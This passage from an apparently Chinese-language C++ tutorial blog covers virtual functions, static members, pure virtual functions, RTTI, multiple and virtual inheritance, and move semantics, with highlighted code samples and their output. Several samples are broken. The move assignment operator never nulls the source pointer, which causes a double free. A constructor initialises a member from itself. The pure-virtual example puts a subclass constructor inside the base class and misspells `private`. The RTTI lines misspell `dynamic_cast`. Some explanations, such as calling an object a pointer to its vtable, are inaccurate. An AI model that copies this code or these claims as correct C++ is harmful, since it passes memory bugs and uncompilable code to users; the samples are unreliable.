class="string">&quot;IceSpear::openFire&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">openFire</span><span class="params">(<span class="type">const</span> Spear* pSpear)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	pSpear-&gt;<span class="built_in">openFire</span>();</span><br><span class="line">	<span class="keyword">delete</span> pSpear;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">FireSpear <span class="title">fireSpear</span><span class="params">(<span class="string">&quot;fanfan&quot;</span>, <span class="string">&quot;sad&quot;</span>, <span class="number">9</span>)</span></span>;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;-------------------&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	<span class="built_in">openFire</span>(<span class="keyword">new</span> <span class="built_in">FireSpear</span>(<span class="string">&quot;fanfan&quot;</span>, <span class="string">&quot;love&quot;</span>, <span class="number">10</span>));</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;-------------------&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Spear()</span><br><span class="line">FireSpear()</span><br><span class="line">-------------------</span><br><span class="line">Spear()</span><br><span class="line">FireSpear()</span><br><span class="line">FireSpear::openFire</span><br><span class="line">~Spear()</span><br><span class="line">-------------------</span><br><span class="line">~FireSpear()</span><br><span class="line">~Spear()</span><br></pre></td></tr></table></figure>



<p>**2.**虚函数的注意事项：</p>
<p>(1) 子父类的虚函数必须完全相同，为了防止开发人员一不小心将函数写错，于是C++11添加了override关键字。</p>
<p><strong>(2)</strong> <strong>父类的析构函数必须为虚函数：当父类对象指向子类对象时，容易使独属于子类的内存泄露。会造成内存泄露的严重问题。</strong></p>
<p>**3.**overide关键字的作用：前面已经说过了，为了防止开发人员将函数名写错了，加入了override关键字。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Spear</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Spear</span>(<span class="type">const</span> std::string&amp; name_, <span class="type">const</span> std::string&amp; icon_) :<span class="built_in">name</span>(name_), <span class="built_in">icon</span>(icon_)</span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;Spear()&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">	~<span class="built_in">Spear</span>()</span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;~Spear()&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">	 <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">openFire</span><span class="params">()</span><span class="type">const</span><span class="comment">//</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;Spear::openFire&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	std::string name;</span><br><span class="line">	std::string icon;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FireSpear</span> :<span class="keyword">public</span> Spear</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">FireSpear</span>(<span class="type">const</span> std::string&amp; name_, <span class="type">const</span> std::string&amp; icon_, <span class="type">int</span> i_) :<span class="built_in">Spear</span>(name_, icon_), <span class="built_in">i</span>(i)</span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;FireSpear()&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">virtual</span> ~<span class="built_in">FireSpear</span>()</span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;~FireSpear()&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">openFire</span><span class="params">()</span><span class="type">const</span> <span class="keyword">override</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;FireSpear::openFire&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">IceSpear</span>: <span class="keyword">public</span> Spear</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">openFire</span><span class="params">()</span><span class="type">const</span><span class="comment">//加了virtual动态绑定</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;IceSpear::openFire&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">openFire</span><span class="params">(<span class="type">const</span> Spear* pSpear)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	pSpear-&gt;<span class="built_in">openFire</span>();</span><br><span class="line">	<span class="keyword">delete</span> pSpear;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">FireSpear <span class="title">fireSpear</span><span class="params">(<span class="string">&quot;fanfan&quot;</span>, <span class="string">&quot;sad&quot;</span>, <span class="number">9</span>)</span></span>;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;-------------------&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	<span class="built_in">openFire</span>(<span class="keyword">new</span> <span class="built_in">FireSpear</span>(<span class="string">&quot;fanfan&quot;</span>, <span class="string">&quot;love&quot;</span>, <span class="number">10</span>));</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;-------------------&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	Spear* pSpear = <span class="keyword">new</span> <span class="built_in">FireSpear</span>(<span class="string">&quot;fanfan&quot;</span>, <span class="string">&quot;happy&quot;</span>, <span class="number">11</span>);</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;-----------------&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Spear()</span><br><span class="line">FireSpear()</span><br><span class="line">-------------------</span><br><span class="line">Spear()</span><br><span class="line">FireSpear()</span><br><span class="line">FireSpear::openFire</span><br><span class="line">~Spear()</span><br><span class="line">-------------------</span><br><span class="line">Spear()</span><br><span class="line">FireSpear()</span><br><span class="line">-----------------</span><br><span class="line">~FireSpear()</span><br><span class="line">~Spear()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><strong>4.</strong> <strong>虚函数实现多态的原理介绍</strong></p>
<p>(1) 动态绑定和静态绑定：</p>
<p>① 静态绑定：程序在编译时就已经确定了函数的地址，比如非虚函数就是静态绑定。</p>
<p>② 动态绑定：程序在编译时确定的是程序寻找函数地址的方法，只有在程序运行时才可以真正确定程序的地址，比如虚函数就是动态绑定。</p>
<p>(2) 虚函数是如何实现动态绑定的呢？</p>
<p>① 每个有虚函数的类都会有一个<strong>虚函数表</strong>，对象其实就是指向虚函数表的指针，编译时编译器只告诉了程序会在运行时查找虚函数表的对应函数。<strong>每个类都会有自己的虚函数表，所以当父类指针引用的是子类虚函数表时，自然调用的就是子类的函数。</strong></p>
<p>总结：虚函数是C++类的重要特性之一，很简单，但使用频率非常高，至于如何实现的也要掌握。</p>
<h2 id="静态成员变量与静态函数"><a href="#静态成员变量与静态函数" class="headerlink" title="静态成员变量与静态函数"></a>静态成员变量与静态函数</h2><p>**1.**静态成员变量：</p>
<p>(1) Part2的第六节课就讲过C语言的静态成员变量，在编译期就已经在静态变量区明确了地址，所以生命周期为程序从开始运行到结束，作用范围为与普通的成员变量相同。这些对于类的静态成员变量同样适用。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="type">static</span> <span class="type">unsigned</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">unsigned</span> Test::i=<span class="number">20</span>;<span class="comment">//必须在类外进行初始化</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    std::cout&lt;&lt;Test::i&lt;&lt;std::endl;<span class="comment">//类名调用</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>(2) 类的静态成员变量因为创建在静态变量区，所以直接属于类，也就是我们可以直接通过类名来调用，当然通过对象调用也可以。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="type">static</span> <span class="type">unsigned</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">unsigned</span> Test::i=<span class="number">20</span>;<span class="comment">//必须在类外进行初始化</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Test test;</span><br><span class="line">    std::cout&lt;&lt;test.i&lt;&lt;std::endl;<span class="comment">//类对象调用</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>**2.**静态成员变量的注意项：</p>
<p>(1) 静态成员变量必须在类外进行初始化，否则会报未定义的错误，不能用构造函数进行初始化。因为静态成员变量在静态变量区，只有一份，而且静态成员变量在编译期就要被创建，成员函数那都是运行期的事情了</p>
<p>**3.**静态成员函数的特点：静态成员函数就是为静态成员变量设计的，就是为了维持封装性。</p>
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">static</span> <span class="type">unsigned</span> <span class="title">getI</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> i; &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">static</span> <span class="type">unsigned</span> i;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">unsigned</span> Test::i = <span class="number">20</span>;<span class="comment">//必须在类外进行初始化</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Test test;</span><br><span class="line">    std::cout &lt;&lt; Test::<span class="built_in">getI</span>() &lt;&lt; std::endl;<span class="comment">//类对象调用</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="纯虚函数"><a href="#纯虚函数" class="headerlink" title="纯虚函数"></a>纯虚函数</h2><p>**1.**纯虚函数介绍：</p>
<p>(1) 还是那个枪械射击的例子，基础的枪类有对应的对象吗？没有。它唯一的作用就是被子类继承。</p>
<p>(2) 基类的openfire函数实现过程有意义吗？没有。它就是用来被重写的。</p>
<p>(3) 所以纯虚函数的语法诞生了，只要将一个虚函数写为纯虚函数，那么该类将被认为无实际意义的类，无法产生对象。纯虚函数也不用去写实际部分。写了编译期也会自动忽略。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Spear</span><span class="comment">//父类</span></span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    std::string name;</span><br><span class="line">    std::string icon;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">FireSpear</span>(<span class="type">const</span> std::string&amp; name_, <span class="type">const</span> std::string&amp; icon_,<span class="type">int</span> i) <span class="built_in">Spear</span>(name_,icon_), <span class="built_in">i</span>(i)</span><br><span class="line">    &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Spear()&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">openFire</span><span class="params">()</span><span class="type">const</span></span>=<span class="number">0</span><span class="comment">//变成纯虚函数，不需要实现，后边不用写，但是不能把虚构函数和虚构函数忽略</span></span><br><span class="line">    &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Spear::openFire&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">pirvate:</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FireSpear</span> : <span class="keyword">public</span> Spear</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">openFire</span><span class="params">()</span><span class="type">const</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        std::cout&lt;&lt;<span class="string">&quot;FireSpear::openfire&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"> <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">openFire</span><span class="params">(<span class="type">const</span> Spear* pSpear)</span><span class="comment">//加了virtual动态绑定</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    pSpear-&gt;<span class="built_in">openFire</span>();</span><br><span class="line">    <span class="keyword">delete</span> pSpear;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">openFire</span>(<span class="keyword">new</span> <span class="built_in">FireSpear</span>(<span class="string">&quot;acd&quot;</span>, <span class="string">&quot;sad&quot;</span>, <span class="number">10</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 总结：纯虚函数的特点就是语法简单，却经常使用，必会。</p>
<h2 id="RTTL"><a href="#RTTL" class="headerlink" title="RTTL"></a>RTTL</h2><p>**1.**RTTI介绍：</p>
<p>(1) RTTI（Run Time Type Identification）即通过运行时类型识别，程序能够通过基类的指针或引用来检查这些指针或引用所指向的对象的实际派生类。</p>
<p>(2) C++为了支持多态，C++的指针或引用的类型可能与它实际指向对象的类型不相同，这时就需要rtti去判断类的实际类型了，<strong>rtti是C++判断指针或引用实际类型的唯一方式。</strong></p>
<p> <strong>2.<strong>RTTI的使用场景：</strong>可能有很多人会疑惑RTTI的作用，所以单独拿出来说一下。</strong></p>
<p>(1) 异常处理：这是RTTI最主要的使用场景，具体作用在异常处理章节会详细讲解。</p>
<p>(2) IO操作：具体作用等到IO章节会详细讲解。</p>
<p>**3.**RTTI的使用方式：RTTI的使用过程就两个函数</p>
<p>(1) typeid函数：typeid函数返回的一个叫做type_info的结构体，该结构体包括了所指向对象的实际信息，其中name()函数就可以返回函数的真实名称。type_info结构体其他函数没什么用.</p>
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">std::cout&lt;&lt;<span class="built_in">typeid</span>(*指针).<span class="built_in">name</span>()&lt;&lt;std::endl;</span><br></pre></td></tr></table></figure>

<p>(2) dynamic_cast函数：C++提供的将父类指针转化为子类指针的函数。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">FirSpear* pFirSpear=<span class="built_in">dunamic_cast</span>&lt;FireSpear*&gt;(pSpear);<span class="comment">//指针和引用可以，转化成功返回对应指针，不成功NONE</span></span><br></pre></td></tr></table></figure>

<p>重要写法</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(std::<span class="built_in">string</span>(<span class="built_in">typeid</span>(*pSpear).<span class="built_in">name</span>())==<span class="string">&quot;class FirSpear&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    FirSpear* pFirSpear=<span class="built_in">dunamic_cast</span>&lt;FirSpear*&gt;(pSpear);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>1.RTTI的注意事项：</strong></p>
<p><strong>当使用typeid函数时，父类和子类必须有虚函数（父类有了虚函数，子类自然会有虚函数），否则类型判断会出错。</strong></p>
<p>RTTI总结：就是C++在运行阶段判断对象实际类型的唯一方式。</p>
<h2 id="多继承"><a href="#多继承" class="headerlink" title="多继承"></a>多继承</h2><p>多继承了解一下就可以了。</p>
<p>**1.**多继承的概念：就是一个类同时继承多个类，在内存上，该类对象前面依次为第一个继承的类，第二个继承的类，依次类推。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">#<span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Base1</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Base1</span>(<span class="type">int</span> base1I_) :<span class="built_in">base1I</span>(base1I_) &#123; std::cout &lt;&lt; <span class="string">&quot;Base1()&quot;</span> &lt;&lt; std::endl; &#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="type">int</span> base1I;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Base2</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Base2</span>(<span class="type">int</span> base2I_) :<span class="built_in">base2I</span>(base2I_) &#123; std::cout &lt;&lt; <span class="string">&quot;Base2()&quot;</span> &lt;&lt; std::endl; &#125;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="type">int</span> base2I;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dervied</span> : <span class="keyword">public</span> Base1, <span class="keyword">public</span> Base2</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Dervied</span>(<span class="type">int</span> base1I_, <span class="type">int</span> base2I_, <span class="type">int</span> i_) :<span class="built_in">Base1</span>(base1I_), <span class="built_in">Base2</span>(base2I_), <span class="built_in">i</span>(i_)</span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;Derived&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">Dervied <span class="title">dervied</span><span class="params">(<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>)</span></span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Base1</span>()</span><br><span class="line"><span class="built_in">Base2</span>()</span><br><span class="line">Derived<span class="comment">//优先调用子类的参数，但是如果调用父类们相同的参数，就会出错</span></span><br></pre></td></tr></table></figure>

<p>**2.**多继承的注意点：</p>
<p>(1) 多继承最需要注意的点就是重复继承的问题</p>
<p>(2) 多继承会使整个程序的设计更加复杂，平常不推荐使用。C++语言中用到多继承的地方主要就是借口模式。相较于C++，java直接取消了多继承的功能，添加了借口。</p>
<p><strong>3.<strong>多继承的总结：多</strong>继承这个语法虽然在某些情况下使代码写起来更加简洁，但会使程序更加复杂难懂，一般来说除了借口模式不推荐使用。</strong></p>
<h2 id="虚继承及其实现原理"><a href="#虚继承及其实现原理" class="headerlink" title="虚继承及其实现原理"></a>虚继承及其实现原理</h2><p>**1.**虚继承的概念：虚继承就是为了避免多重继承时产生的二义性问题。虚继承的问题用语言不好描述，但用代码非常简单。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TrueBase</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	std::string icon;</span><br><span class="line">	<span class="type">int</span> i = <span class="number">100</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Base1</span> :  <span class="keyword">virtual</span> <span class="keyword">public</span> TrueBase<span class="comment">//虚继承</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Base1</span>(<span class="type">int</span> base1I_) :<span class="built_in">base1I</span>(base1I_) &#123; std::cout &lt;&lt; <span class="string">&quot;Base1()&quot;</span> &lt;&lt; std::endl; &#125;</span><br><span class="line">	<span class="type">int</span> base1I;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Base2</span> : <span class="keyword">virtual</span> <span class="keyword">public</span> TrueBase<span class="comment">//虚继承</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Base2</span>(<span class="type">int</span> base2I_) :<span class="built_in">base2I</span>(base2I_) &#123; std::cout &lt;&lt; <span class="string">&quot;Base2()&quot;</span> &lt;&lt; std::endl; &#125;</span><br><span class="line">	<span class="type">int</span> base2I;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dervied</span> :<span class="keyword">virtual</span> <span class="keyword">public</span> Base1, <span class="keyword">virtual</span> <span class="keyword">public</span> Base2<span class="comment">//这里可加可不加，不太理解就加上</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Dervied</span>(<span class="type">int</span> base1I_, <span class="type">int</span> base2I_, <span class="type">int</span> i_) :<span class="built_in">Base1</span>(base1I_), <span class="built_in">Base2</span>(base2I_)</span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;Derived&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">Dervied <span class="title">derived</span><span class="params">(<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>)</span></span>;</span><br><span class="line">	std::cout &lt;&lt; derived.i &lt;&lt; std::endl;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Base1()</span><br><span class="line">Base2()</span><br><span class="line">Derived</span><br><span class="line">100</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>**2.**虚继承的实现原理介绍：</p>
<p>(1) 使用了虚继承的类会有一个虚继承表，表中存放了父类所有成员变量相对于类的偏移地址。</p>
<p>(2) 按照刚才的代码，B1，B2类同时有一个虚继承表，当C类同时继承B1和B2类时，每继承一个就会用虚继承表进行比对，发现该变量在虚继承表中偏移地址相同，就只会继承一份。</p>
<p>**4.**虚继承的总结：这个语法就是典型的语法简单，但在游戏开发领域经常使用的语法，其它领域使用频率会低很多。</p>
<h2 id="移动构造函数与移动赋值运算符"><a href="#移动构造函数与移动赋值运算符" class="headerlink" title="(**)移动构造函数与移动赋值运算符"></a>(**)移动构造函数与移动赋值运算符</h2><p>**1.**对象移动的概念：</p>
<p>(1) 对一个体积比较大的类进行大量的拷贝操作是非常消耗性能的，因此C++11中加入了“对象移动”的操作</p>
<p>(2) 所谓的对象移动，其实就是把该对象占据的内存空间的访问权限转移给另一个对象。比如一块内存原本属于A，在进行“移动语义”后，这块内存就属于B了。</p>
<p> **2.**移动语义为什么可以提高程序运行效率。因为我们的各种操作经常会进行大量的“复制构造”，“赋值运算”操作。这两个操作非常耗费时间。移动构造是直接转移权限，这是不是就快多了。</p>
<p><strong>注意：在进行转移操作后，被转移的对象就不能继续使用了，所以对象移动一般都是对临时对象进行操作（因为临时对象很快就要销毁了）。</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Test</span>() = <span class="keyword">default</span>;<span class="comment">//默认构造函数</span></span><br><span class="line">	<span class="built_in">Test</span>(<span class="type">const</span> Test&amp; test)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (test.str)</span><br><span class="line">		&#123;</span><br><span class="line">			str = <span class="keyword">new</span> <span class="type">char</span>[<span class="built_in">strlen</span>(test.str) + <span class="number">1</span>]();<span class="comment">//加1不能省略</span></span><br><span class="line">			<span class="built_in">strcpy_s</span>(str, <span class="built_in">strlen</span>(test.str) + <span class="number">1</span>, test.str);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			str = <span class="literal">nullptr</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">Test</span>(Test&amp;&amp; test)<span class="comment">//移动构造函数</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (test.str)</span><br><span class="line">		&#123;</span><br><span class="line">			str = test.str;</span><br><span class="line">			test.str = <span class="literal">nullptr</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			str = <span class="literal">nullptr</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	Test&amp; <span class="keyword">operator</span>=(<span class="type">const</span> Test&amp; test)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">this</span> == &amp;test)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (str) &#123;<span class="comment">//是否为空字符串</span></span><br><span class="line">			<span class="keyword">delete</span>[] str;</span><br><span class="line">			str = <span class="literal">nullptr</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (test.str)</span><br><span class="line">		&#123;</span><br><span class="line">			str = <span class="keyword">new</span> <span class="type">char</span>[<span class="built_in">strlen</span>(test.str) + <span class="number">1</span>]();</span><br><span class="line">			<span class="built_in">strcpy_s</span>(str, <span class="built_in">strlen</span>(test.str) + <span class="number">1</span>, test.str);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			str = <span class="literal">nullptr</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	Test&amp; <span class="keyword">operator</span> = (Test&amp;&amp; test)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">this</span> == &amp;test)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (str) &#123;</span><br><span class="line">			<span class="keyword">delete</span>[] str;</span><br><span class="line">			str = <span class="literal">nullptr</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (test.str)</span><br><span class="line">		&#123;</span><br><span class="line">			str = test.str;<span class="comment">//转移权限</span></span><br><span class="line">			test.str;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			str = <span class="literal">nullptr</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="type">char</span>* str = <span class="literal">nullptr</span>;<span class="comment">//规范写法</span></span><br><span 